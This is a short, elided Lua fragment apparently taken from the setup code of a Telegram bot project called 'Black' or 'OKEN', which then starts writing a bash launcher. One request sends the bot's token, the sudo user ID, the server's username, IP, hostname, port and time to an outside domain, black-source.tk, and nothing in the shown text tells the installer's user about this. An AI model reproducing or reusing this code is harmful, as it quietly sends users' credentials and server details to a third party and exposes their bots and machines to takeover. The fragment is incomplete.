...
data,res = https.request("https://black-source.tk/OKENTAEM/index.php?bn=info&id="..Id)
if res == 200 then
...
local t = json:decode(https.request('https://black-source.tk/OKENTAEM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("OKEN", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/OKEN
